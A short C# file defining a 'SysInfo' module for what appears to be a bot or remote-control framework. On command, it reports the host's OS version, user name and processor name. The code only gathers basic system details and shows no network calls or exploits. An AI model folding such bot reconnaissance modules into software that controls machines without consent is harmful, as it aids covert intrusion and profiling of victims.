using System;
using Spindle;

namespace CoreModule.Modules {
    /// <summary>
    ///     Module to get system information from a bot
    /// </summary>
    public class SysInfo : IBotModule {
        public string Identifier => "SYSINFO";

        public string CommandReceived(string command) {
            return $"{Identifier} {Environment.OSVersion};{Environment.UserName};{Util.GetObject("Win32_Processor", "Name")}";
        }
    }
}
